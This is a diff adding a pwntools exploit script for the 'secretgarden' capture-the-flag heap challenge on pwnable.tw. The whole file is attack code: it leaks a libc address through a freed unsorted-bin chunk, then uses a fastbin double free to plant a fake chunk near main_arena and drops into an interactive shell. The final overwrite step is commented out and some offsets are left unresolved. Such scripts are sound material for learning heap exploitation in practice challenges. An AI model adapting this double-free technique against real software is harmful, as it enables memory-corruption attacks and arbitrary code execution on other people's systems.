@@ -1,0 +1,62 @@
+from pwn import *
+#s = remote('192.168.50.4',1234)
+#s = remote('chall.pwnable.tw',10203)
+env = {'LD_PRELOAD': './libc_64.so.6'}
+
+s = process("./secretgarden", env=env)
+def new(length,name,color):
+  s.recvuntil('choice :')
+  s.send('1\n')
+  s.recvuntil('name :')
+  s.send(str(length)+'\n')
+  s.recvuntil('flower :')
+  s.send(name)
+  s.recvuntil('flower :')
+  s.send(color)
+def remove(index):
+  s.recvuntil('choice :')
+  s.send('3\n')
+  s.recvuntil('garden:')
+  s.send(str(index)+'\n')
+#STAGE 1
+new(1024,'AAAA','AAAA\n')
+new(1024,'BBBB','BBBB\n')
+new(1024,'CCCC','CCCC\n')
+remove(0)
+s.recvuntil('choice :')
+s.send('4\n')
+s.recvuntil('Done!')
+new(1024,'B'*8,'1234\n')
+s.recvuntil('choice :')
+s.send('2\n')
+main_arena = u64(s.recvuntil('C')[-2-6:-2]+'\x00\x00')-88
+#main_arena -- 03C3B20 / 03be760 
+libc_base = main_arena #- 0x3C3B20#0x3be760
+log.info('main_arena : %x'%main_arena)
+log.info('libc_base : %x'%libc_base)
+#STAGE 2
+#magic [remote]/04647C
+'''
+remove(1)
+remove(2)
+remove(0)
+s.recvuntil('choice :')
+s.send('4\n')
+s.recvuntil('Done!')
+new(1024,'B'*17,'1234\n')
+s.recvuntil('choice :')
+s.send('2\n')
+heap = u64(s.recvuntil('C')[-2-6:-2]+'\x00\x00') - 0x42
+log.info("heap : %x"%heap)
+'''
+new(0x68,'AAAA','AAAA\n')
+new(0x68,'CCCC','CCCC\n')
+remove(3)
+remove(4)
+remove(3)
+fake_chunk = main_arena - 0x23#libc_base + 0x3be72d
+new(0x68,p64(fake_chunk),'AAAA\n')
+new(0x68,'CCCC','CCCC\n')
+new(0x68,p64(fake_chunk),'BBBB\n')
+#new(0x68,'AAA'*8+p64(libc_base+0x46590),'BBBB\n')
+s.interactive()
